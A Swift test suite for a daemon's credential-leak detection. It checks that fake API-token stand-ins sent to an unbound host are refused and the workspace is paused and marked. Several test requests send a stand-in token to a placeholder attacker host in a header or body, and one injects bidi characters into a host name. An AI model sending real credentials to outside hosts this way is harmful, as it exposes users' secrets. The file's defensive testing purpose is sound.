import Foundation
import NIOConcurrencyHelpers
import Testing
@testable import ACLinux

extension DaemonGlobalSuites {
    /// A stand-in on its way to a host it isn't bound to (macOS: HTTPProxy's
    /// detectCompromise step): refused, recorded, the compromise raised; and
    /// the mark that keeps a workspace from booting until it's cleared.
    @Suite("Compromise detection", .serialized)
    struct CompromiseTests {
        @Test func aStandInSentToTheWrongHostIsRefusedAndRaised() throws {
            let dir = try shortTempDir(); defer { try? FileManager.default.removeItem(atPath: dir) }
            let proxy = try MitmProxy(caDirectory: URL(fileURLWithPath: dir + "/mitm", isDirectory: true))
            let pid = UUID()
            let fake = "sk_" + "live_FAKEstandin0123456789abcdef"
            proxy.swapper.setMap(TokenMap(entries: [TokenMap.Entry(fake: fake, real: "sk_" + "live_REAL-not-for-anyone", host: "api.stripe.com")]),
                                 for: pid)
            let raised = NIOLockedValueBox<[CompromiseEvent]>([])
            proxy.swapper.setCompromiseHandler { e in raised.withLockedValue { $0.append(e) } }
            // To its own host: on to the rest of the chain.
            let ok = Data("GET /v1/balance HTTP/1.1\r\nHost: api.stripe.com\r\nAuthorization: Bearer \(fake)\r\n\r\n".utf8)
            #expect(RequestReader.compromiseAnswer(ok, proxy: proxy, profileID: pid, host: "api.stripe.com") == nil)
            #expect(raised.withLockedValue { $0 }.isEmpty)
            // Elsewhere (in a header, then in a body): refused, raised.
            for req in ["GET / HTTP/1.1\r\nHost: evil.example\r\nAuthorization: Bearer \(fake)\r\n\r\n",
                        "POST /x HTTP/1.1\r\nHost: evil.example\r\nContent-Length: \(fake.count + 4)\r\n\r\nkey=\(fake)"] {
                let answer = try #require(RequestReader.compromiseAnswer(Data(req.utf8), proxy: proxy, profileID: pid, host: "evil.example"))
                let text = String(decoding: answer, as: UTF8.self)
                #expect(text.hasPrefix("HTTP/1.1 451 ") && text.contains("leaked credential"), "\(text)")
                #expect(!text.contains(fake) && !text.contains("REAL"), "the reply carries neither value")
            }
            let events = raised.withLockedValue { $0 }
            #expect(events.count == 2 && events.allSatisfy { $0.profileID == pid && $0.observedHost == "evil.example" })
            #expect(events.first?.leaks.first?.declaredHost == "api.stripe.com")
            // Once the user allowed the host for the session: through, not raised.
            proxy.swapper.allowSessionHosts(["evil.example"], for: pid)
            #expect(RequestReader.compromiseAnswer(Data("GET / HTTP/1.1\r\nHost: evil.example\r\nAuthorization: Bearer \(fake)\r\n\r\n".utf8),
                                                   proxy: proxy, profileID: pid, host: "evil.example") == nil)
        }

        /// "Allow" lasts the session: a stop takes it, with the swap map.
        @Test func anAllowedDestinationEndsWithTheSession() async throws {
            let (d, _, dir) = try await DaemonRepairGateTests.daemon()
            defer { try? FileManager.default.removeItem(atPath: dir) }
            let proxy = try #require(await d.mitm)
            let pid = UUID(), fake = "sk_" + "live_FAKEstandin0123456789abcdef"
            proxy.swapper.setMap(TokenMap(entries: [TokenMap.Entry(fake: fake, real: "sk_" + "live_REAL-x", host: "api.stripe.com")]), for: pid)
            proxy.swapper.allowSessionHosts(["evil.example"], for: pid)
            let req = Data("GET / HTTP/1.1\r\nHost: evil.example\r\nAuthorization: Bearer \(fake)\r\n\r\n".utf8)
            #expect(RequestReader.compromiseAnswer(req, proxy: proxy, profileID: pid, host: "evil.example") == nil, "allowed this session")
            await d.clearWorkspaceProxyState(pid)
            #expect(proxy.swapper.entries(for: pid).isEmpty, "the swap map went with the session")
            proxy.swapper.setMap(TokenMap(entries: [TokenMap.Entry(fake: fake, real: "sk_" + "live_REAL-x", host: "api.stripe.com")]), for: pid)
            #expect(RequestReader.compromiseAnswer(req, proxy: proxy, profileID: pid, host: "evil.example") != nil, "the next session asks again")
            await d.shutdown()
        }

        @Test func aMarkedWorkspaceDoesntBootUntilTheMarkIsCleared() async throws {
            let (d, _, dir) = try await DaemonRepairGateTests.daemon()
            defer { try? FileManager.default.removeItem(atPath: dir) }
            let prior = ProfileStore.defaultRootDir
            ProfileStore.defaultRootDir = URL(fileURLWithPath: dir + "/state/profiles", isDirectory: true)
            defer { ProfileStore.defaultRootDir = prior }
            let p = try ProfileStore().save(Profile(name: "marked", tool: .claude, authMode: .token))
            let rec = RepairMarksTests.stopped(p.id.uuidString)
            try await d.registerForTesting(rec)
            Daemon.markCompromised(p, store: ProfileStore())
            #expect(Daemon.isCompromised(p, store: ProfileStore()))
            let refused = await d.start(rec)
            #expect(refused.status == 409 && "\(refused.body)".contains("compromised"), "\(refused.body)")
            #expect(await d.resolveCompromise(p.name, action: "wipe").status == 501, "no wipe on Linux yet: said so")
            #expect(await d.resolveCompromise(p.name, action: "clear").status == 200)
            #expect(!Daemon.isCompromised(p, store: ProfileStore()))
            let resolved = ProfileStore().profileDirectory(for: p).appendingPathComponent("compromise.resolved")
            #expect((try? String(contentsOf: resolved, encoding: .utf8)) == "clear", "recorded as a false alarm")
            // Cleared: the start goes on (to the launch, which the hook stops here).
            Daemon.launchHookForTesting.withLockedValue { $0 = { _ in throw CancellationError() } }
            defer { Daemon.launchHookForTesting.withLockedValue { $0 = nil } }
            let again = await d.start(rec)
            #expect(!"\(again.body)".contains("compromised"), "\(again.body)")
            await d.shutdown()
        }
    }
}

/// A VM the compromise handler pauses and resumes (counting both).
final class FakeCompromiseVM: CompromiseVM, @unchecked Sendable {
    let calls = NIOLockedValueBox<[String]>([])
    func pause() async throws { calls.withLockedValue { $0.append("pause") }; try? await Task.sleep(for: .milliseconds(100)) }
    func resume() async throws { calls.withLockedValue { $0.append("resume") } }
}

extension DaemonGlobalSuites {
    /// The handler's branches, on a daemon with a stand-in VM (no client is
    /// watching in these: the broker answers its fallback, Shut down, at once).
    @Suite("Compromise handler", .serialized)
    struct CompromiseHandlerTests {
        static func event(_ pid: UUID) -> CompromiseEvent {
            CompromiseEvent(profileID: pid, observedHost: "evil.example",
                            leaks: [CompromiseLeak(fakeTokenPreview: "#1", credentialDisplayName: "stripe",
                                                   declaredHost: "api.stripe.com", observedHost: "evil.example")],
                            timestamp: Date())
        }

        static func setUp(alertsOff: Bool = false, wired: Bool = false) async throws -> (Daemon, String, Profile) {
            let (d, _, dir) = try await DaemonRepairGateTests.daemon()
            ProfileStore.defaultRootDir = URL(fileURLWithPath: dir + "/state/profiles", isDirectory: true)
            var p = Profile(name: "h", tool: .claude, authMode: .token)
            p.disableExfiltrationAlerts = alertsOff
            p = try ProfileStore().save(p)
            try await d.registerForTesting(RepairMarksTests.stopped(p.id.uuidString))
            // The tests call handleCompromise themselves: the checks they make
            // through the proxy raise nothing behind their back (a raised event
            // would run the handler again, past the test's hooks).
            // `wired`: the daemon's own handler, as a started daemon has it.
            if wired { await d.wireCompromiseHandler() } else { await d.mitm?.swapper.setCompromiseHandler { _ in } }
            return (d, dir, p)
        }

        @Test func noClientShutsDownAndMarks_alertsOffDoesNothing() async throws {
            let prior = ProfileStore.defaultRootDir
            defer { ProfileStore.defaultRootDir = prior; Daemon.compromiseVMForTesting.withLockedValue { $0 = nil } }
            let vm = FakeCompromiseVM()
            Daemon.compromiseVMForTesting.withLockedValue { $0 = { _ in ("vm-1", vm) } }
            var (d, dir, p) = try await Self.setUp()
            await d.handleCompromise(Self.event(p.id))
            #expect(vm.calls.withLockedValue { $0 } == ["pause"], "paused, never resumed")
            #expect(Daemon.isCompromised(p, store: ProfileStore()), "marked")
            await d.shutdown(); try? FileManager.default.removeItem(atPath: dir)
            // The workspace's alerts off: no pause, no mark.
            let quiet = FakeCompromiseVM()
            Daemon.compromiseVMForTesting.withLockedValue { $0 = { _ in ("vm-2", quiet) } }
            (d, dir, p) = try await Self.setUp(alertsOff: true)
            await d.handleCompromise(Self.event(p.id))
            #expect(quiet.calls.withLockedValue { $0 }.isEmpty && !Daemon.isCompromised(p, store: ProfileStore()))
            await d.shutdown(); try? FileManager.default.removeItem(atPath: dir)
        }

        @Test func oneQuestionAtATimePerWorkspace() async throws {
            let prior = ProfileStore.defaultRootDir
            defer { ProfileStore.defaultRootDir = prior; Daemon.compromiseVMForTesting.withLockedValue { $0 = nil } }
            let vm = FakeCompromiseVM()
            Daemon.compromiseVMForTesting.withLockedValue { $0 = { _ in ("vm-1", vm) } }
            let (d, dir, p) = try await Self.setUp()
            defer { try? FileManager.default.removeItem(atPath: dir) }
            async let a: Void = d.handleCompromise(Self.event(p.id))
            async let b: Void = d.handleCompromise(Self.event(p.id))
            _ = await (a, b)
            #expect(vm.calls.withLockedValue { $0.filter { $0 == "pause" }.count } == 1, "\(vm.calls.withLockedValue { $0 })")
            await d.shutdown()
        }

        /// The VM stopped (another session in its place) while the question was
        /// up: the answer is dropped, not applied to the new session.
        @Test func anAnswerForAVMThatsGoneIsDropped() async throws {
            let prior = ProfileStore.defaultRootDir
            defer { ProfileStore.defaultRootDir = prior; Daemon.compromiseVMForTesting.withLockedValue { $0 = nil } }
            let first = FakeCompromiseVM(), second = FakeCompromiseVM()
            let n = NIOLockedValueBox(0)
            Daemon.compromiseVMForTesting.withLockedValue { $0 = { _ in
                n.withLockedValue { $0 += 1; return $0 == 1 } ? ("vm-1", first) : ("vm-2", second)
            } }
            let (d, dir, p) = try await Self.setUp()
            defer { try? FileManager.default.removeItem(atPath: dir) }
            await d.handleCompromise(Self.event(p.id))
            #expect(first.calls.withLockedValue { $0 } == ["pause"] && second.calls.withLockedValue { $0 }.isEmpty)
            #expect(!Daemon.isCompromised(p, store: ProfileStore()), "the late Shut down didn't mark (or kill) the new session")
            await d.shutdown()
        }

        @Test func theRequestChainRefusesALeakBeforeAnythingGoesUp() throws {
            let rig = try ProxyEgressPolicyTests.Rig(); defer { rig.stop() }
            let ip = try #require(Daemon.primaryIPv4())
            let up = try RawUpstream(host: ip, reply: "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok")
            defer { up.stop() }
            let fake = "sk_" + "live_FAKEstandin0123456789abcdef"
            rig.proxy.swapper.setMap(TokenMap(entries: [TokenMap.Entry(fake: fake, real: "sk_" + "live_REAL-x", host: "api.stripe.com")]), for: rig.pid)
            defer { rig.proxy.swapper.clearMap(for: rig.pid) }
            let h = "\(ip):\(up.port)"
            let out = try PipelineTests.talk(rig.path(), "GET http://\(h)/x HTTP/1.1\r\nHost: \(h)\r\nAuthorization: Bearer \(fake)\r\n\r\n")
            #expect(out.hasPrefix("HTTP/1.1 451"), "\(out.prefix(120))")
            #expect(up.received.withLockedValue { $0 }.isEmpty, "nothing reached the upstream")
        }

        static func strict(_ d: Daemon, _ pid: UUID) async throws {
            var cfg = GuardrailsConfig(kubernetes: .off, kubeHosts: [])
            cfg.strictCredentials = true
            try #require(await d.mitm).setGuardrailsConfig(cfg, for: pid)
        }

        static func unmanaged(_ d: Daemon, _ pid: UUID, _ token: String) async -> Bool {
            guard let proxy = await d.mitm else { return false }
            return RequestReader.unmanagedAnswer(Data("GET / HTTP/1.1\r\nHost: evil.example\r\nAuthorization: Bearer \(token)\r\n\r\n".utf8),
                                                 proxy: proxy, profileID: pid, host: "evil.example") != nil
        }

        /// Allow: a stand-in's destination for the session, or strict mode's
        /// credentials themselves (wherever they go); the VM runs again.
        @Test func allowTrustsTheHostOrTheCredentialsForTheSession() async throws {
            let prior = ProfileStore.defaultRootDir
            defer {
                ProfileStore.defaultRootDir = prior
                Daemon.compromiseVMForTesting.withLockedValue { $0 = nil }
                Daemon.compromiseAnswerForTesting.withLockedValue { $0 = nil }
            }
            let vm = FakeCompromiseVM()
            Daemon.compromiseVMForTesting.withLockedValue { $0 = { _ in ("vm-1", vm) } }
            Daemon.compromiseAnswerForTesting.withLockedValue { $0 = { _ in 2 } }
            let (d, dir, p) = try await Self.setUp()
            defer { try? FileManager.default.removeItem(atPath: dir) }
            let proxy = try #require(await d.mitm)
            // A stand-in sent elsewhere: the host is trusted.
            let fake = "sk_" + "live_FAKEstandin0123456789abcdef"
            proxy.swapper.setMap(TokenMap(entries: [TokenMap.Entry(fake: fake, real: "sk_" + "live_REAL-x", host: "api.stripe.com")]), for: p.id)
            await d.handleCompromise(Self.event(p.id))
            #expect(RequestReader.compromiseAnswer(Data("GET / HTTP/1.1\r\nHost: evil.example\r\nAuthorization: Bearer \(fake)\r\n\r\n".utf8),
                                                   proxy: proxy, profileID: p.id, host: "evil.example") == nil)
            #expect(vm.calls.withLockedValue { $0 } == ["pause", "resume"])
            // A credential Bromure didn't issue: exactly it, for the session.
            try await Self.strict(d, p.id)
            let tok = StrictCredentialsTests.real, other = StrictCredentialsTests.token("0th3r")
            #expect(await Self.unmanaged(d, p.id, tok))
            var event = Self.event(p.id)
            event.unmanagedFingerprints = [UnmanagedCredentialGuard.fingerprint(tok)]
            let (_, text) = Daemon.compromiseQuestion(event, workspace: p.name)
            #expect(text.contains("these credentials") && text.contains("any host") && !text.contains("trusts this destination"), "\(text)")
            await d.handleCompromise(event)
            let allowed = await !Self.unmanaged(d, p.id, tok), stillRefused = await Self.unmanaged(d, p.id, other)
            #expect(allowed && stillRefused, "that credential only")
            #expect(vm.calls.withLockedValue { $0 } == ["pause", "resume", "pause", "resume"])
            await d.shutdown()
        }

        /// The MUST: the VM stopped and the workspace started again while the
        /// question was up. The late Allow reaches neither the new session's
        /// credentials nor its hosts.
        @Test func aLateAllowDoesntReachTheNextSession() async throws {
            let prior = ProfileStore.defaultRootDir
            defer {
                ProfileStore.defaultRootDir = prior
                Daemon.compromiseVMForTesting.withLockedValue { $0 = nil }
                Daemon.compromiseAnswerForTesting.withLockedValue { $0 = nil }
            }
            let first = FakeCompromiseVM(), second = FakeCompromiseVM()
            let restarted = NIOLockedValueBox(false)
            Daemon.compromiseVMForTesting.withLockedValue { $0 = { _ in
                restarted.withLockedValue { $0 } ? ("vm-2", second) : ("vm-1", first)
            } }
            let (d, dir, p) = try await Self.setUp()
            defer { try? FileManager.default.removeItem(atPath: dir) }
            try await Self.strict(d, p.id)
            Daemon.compromiseAnswerForTesting.withLockedValue { $0 = { pid in
                // The stop's share in the proxy (clearWorkspaceProxyState's,
                // without its main-actor kube step): policies and swap map.
                let proxy = await d.mitm
                proxy?.clearWorkspacePolicies(pid)
                proxy?.swapper.clearMap(for: pid)
                try? await Self.strict(d, pid)                 // the next session
                restarted.withLockedValue { $0 = true }
                return 2                                       // then the Allow
            } }
            let tok = StrictCredentialsTests.real
            var event = Self.event(p.id)
            event.unmanagedFingerprints = [UnmanagedCredentialGuard.fingerprint(tok)]
            await d.handleCompromise(event)
            #expect(await Self.unmanaged(d, p.id, tok), "the new session still refuses it")
            let proxy = try #require(await d.mitm)
            let fake = "sk_" + "live_FAKEstandin0123456789abcdef"
            proxy.swapper.setMap(TokenMap(entries: [TokenMap.Entry(fake: fake, real: "sk_" + "live_REAL-x", host: "api.stripe.com")]), for: p.id)
            defer { proxy.swapper.clearMap(for: p.id) }
            #expect(RequestReader.compromiseAnswer(Data("GET / HTTP/1.1\r\nHost: evil.example\r\nAuthorization: Bearer \(fake)\r\n\r\n".utf8),
                                                   proxy: proxy, profileID: p.id, host: "evil.example") != nil, "nor its hosts")
            #expect(second.calls.withLockedValue { $0 }.isEmpty, "the new VM untouched")
            await d.shutdown()
        }

        /// An event raised in a session that ended before the handler ran
        /// (the VM stopped) pauses and asks nothing.
        @Test func anEventFromASessionThatEndedIsDropped() async throws {
            let prior = ProfileStore.defaultRootDir
            defer {
                ProfileStore.defaultRootDir = prior
                Daemon.compromiseVMForTesting.withLockedValue { $0 = nil }
                Daemon.compromiseAnswerForTesting.withLockedValue { $0 = nil }
            }
            let vm = FakeCompromiseVM()
            Daemon.compromiseVMForTesting.withLockedValue { $0 = { _ in ("vm-2", vm) } }
            let asked = NIOLockedValueBox(0)
            Daemon.compromiseAnswerForTesting.withLockedValue { $0 = { _ in asked.withLockedValue { $0 += 1 }; return 0 } }
            let (d, dir, p) = try await Self.setUp()
            defer { try? FileManager.default.removeItem(atPath: dir) }
            let proxy = try #require(await d.mitm)
            let old = proxy.strictSession(of: p.id)
            proxy.clearGuardrailsConfig(for: p.id)       // the stop; the new VM runs
            await d.handleCompromise(Self.event(p.id), session: old)
            #expect(vm.calls.withLockedValue { $0 }.isEmpty && asked.withLockedValue { $0 } == 0)
            #expect(!Daemon.isCompromised(p, store: ProfileStore()), "the new session isn't marked")
            await d.shutdown()
        }

        /// One question at a time per session: the next session's VM is asked
        /// while the old question is still up.
        @Test func theNextSessionIsAskedOnItsOwn() async throws {
            let prior = ProfileStore.defaultRootDir
            defer {
                ProfileStore.defaultRootDir = prior
                Daemon.compromiseVMForTesting.withLockedValue { $0 = nil }
                Daemon.compromiseAnswerForTesting.withLockedValue { $0 = nil }
            }
            let vm = FakeCompromiseVM()
            Daemon.compromiseVMForTesting.withLockedValue { $0 = { _ in ("vm-1", vm) } }
            let asked = NIOLockedValueBox(0)
            let gate = AsyncStream<Void>.makeStream()
            Daemon.compromiseAnswerForTesting.withLockedValue { $0 = { _ in
                if asked.withLockedValue({ $0 += 1; return $0 }) == 1 {
                    var it = gate.stream.makeAsyncIterator(); _ = await it.next()   // the first question stays up
                }
                return 1
            } }
            let (d, dir, p) = try await Self.setUp()
            defer { try? FileManager.default.removeItem(atPath: dir) }
            let proxy = try #require(await d.mitm)
            let first = Task { await d.handleCompromise(Self.event(p.id)) }
            for _ in 0..<500 where asked.withLockedValue({ $0 }) == 0 { try await Task.sleep(for: .milliseconds(10)) }
            await d.handleCompromise(Self.event(p.id))
            #expect(asked.withLockedValue { $0 } == 1, "the same session: not asked twice")
            proxy.clearGuardrailsConfig(for: p.id)       // a stop and a new session
            await d.handleCompromise(Self.event(p.id))
            #expect(asked.withLockedValue { $0 } == 2, "the new session is asked on its own")
            gate.continuation.finish()
            await first.value
            await d.shutdown()
        }

        /// A leak's event carries its request's session, taken when the request
        /// was read. Held at a guardrails consent while the workspace stopped
        /// and started again, it reaches the daemon's own handler (through the
        /// swapper, as in a started daemon) stale: the new VM isn't paused,
        /// asked or marked. Without the restart, the same request is acted on.
        @Test(arguments: [false, true])
        func aLeakHeldAtAConsentAcrossARestartReachesNoNewSession(restarted: Bool) async throws {
            let prior = ProfileStore.defaultRootDir
            defer {
                ProfileStore.defaultRootDir = prior
                Daemon.compromiseVMForTesting.withLockedValue { $0 = nil }
                Daemon.compromiseAnswerForTesting.withLockedValue { $0 = nil }
                ConsentPrompt.chooseForTesting.withLockedValue { $0 = nil }
            }
            let vm = FakeCompromiseVM()
            let looked = NIOLockedValueBox(0)
            Daemon.compromiseVMForTesting.withLockedValue { $0 = { _ in looked.withLockedValue { $0 += 1 }; return ("vm-1", vm) } }
            Daemon.compromiseAnswerForTesting.withLockedValue { $0 = { _ in 1 } }    // Block: no mark either way
            let (d, dir, p) = try await Self.setUp(wired: true)
            defer { try? FileManager.default.removeItem(atPath: dir) }
            let proxy = try #require(await d.mitm)
            // A GitHub write asks first (promptOnWrite); the consent is held.
            let cfg = GuardrailsConfig(kubernetes: .off, kubeHosts: [], github: .promptOnWrite)
            proxy.setGuardrailsConfig(cfg, for: p.id)
            defer { proxy.clearGuardrailsConfig(for: p.id) }
            let asked = NIOLockedValueBox(false)
            let gate = AsyncStream<Void>.makeStream()
            ConsentPrompt.chooseForTesting.withLockedValue { $0 = { _ in
                asked.withLockedValue { $0 = true }
                var it = gate.stream.makeAsyncIterator(); _ = await it.next()
                return 1                                                            // Allow once
            } }
            let fake = "sk_" + "live_FAKEstandin0123456789abcdef"
            proxy.swapper.setMap(TokenMap(entries: [TokenMap.Entry(fake: fake, real: "sk_" + "live_REAL-x", host: "api.stripe.com")]), for: p.id)
            defer { proxy.swapper.clearMap(for: p.id) }
            let session = proxy.strictSession(of: p.id)                             // as RequestReader takes it at .complete
            let pid = p.id
            let request = Task {
                var req = Data("POST /repos/o/r/issues HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: Bearer \(fake)\r\nContent-Length: 0\r\n\r\n".utf8)
                return await RequestReader.policyAnswer(&req, proxy: proxy, profileID: pid, host: "api.github.com",
                                                        port: 443, tls: true, session: session)
            }
            for _ in 0..<250 where !asked.withLockedValue({ $0 }) { try await Task.sleep(for: .milliseconds(20)) }
            #expect(asked.withLockedValue { $0 }, "held at the consent")
            if restarted {
                proxy.clearGuardrailsConfig(for: p.id)                               // the stop
                proxy.setGuardrailsConfig(cfg, for: p.id)                            // the next session
            }
            gate.continuation.finish()
            let answer = await request.value
            #expect(answer.map { String(decoding: $0, as: UTF8.self) }?.hasPrefix("HTTP/1.1 451") == true, "the leak is refused either way")
            // The handler runs on its own task: given time to act.
            for _ in 0..<100 where vm.calls.withLockedValue({ $0 }).count < 2 { try await Task.sleep(for: .milliseconds(20)) }
            if restarted {
                #expect(vm.calls.withLockedValue { $0 }.isEmpty && looked.withLockedValue { $0 } == 0, "the new session's VM untouched")
            } else {
                #expect(vm.calls.withLockedValue { $0 } == ["pause", "resume"], "the same session: paused and asked")
            }
            await d.shutdown()
        }

        @Test func aGuestNamedHostIsShownSafely() {
            #expect(Daemon.sanitizedHost("evil.example\n\u{202E}moc.knab") == "evil.examplemoc.knab")
            #expect(Daemon.sanitizedHost("\u{0007}\u{0008}") == "(unprintable host)")
            #expect(Daemon.sanitizedHost(String(repeating: "a", count: 400)).count == 253)
        }
    }
}
